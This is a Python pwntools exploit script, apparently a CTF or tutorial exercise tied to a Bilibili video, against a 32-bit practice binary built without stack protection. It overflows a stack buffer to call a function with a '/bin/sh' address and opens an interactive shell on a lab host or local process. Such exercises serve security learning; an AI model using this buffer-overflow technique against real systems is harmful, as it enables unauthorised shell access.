'''
Author: 白银
Date: 2022-11-18 16:11:26
LastEditTime: 2022-11-18 17:20:33
LastEditors: 白银
Description: gcc question_4_2.c -m32 -fno-stack-protector -no-pie -o question_4_2_x86  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=992.4
'''

from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_4_2_x86'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.134", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x14  # ida看，buf和r差多少
return_addr = 0x8049176  # p &func
deadbeef = 0xdeadbeef  # func的返回地址，随意
bin_sh_addr = 0x804c018  # search "/bin/sh"

''' payload内容排序
ebp     ->  0xdeadbeef 
eip(r)  ->  func_addr
        ->  0xdeadbeef
        ->  argc1
        ->  argc2
        ->  argc3
'''
payload = flat(['a' * padding, return_addr, deadbeef, bin_sh_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()
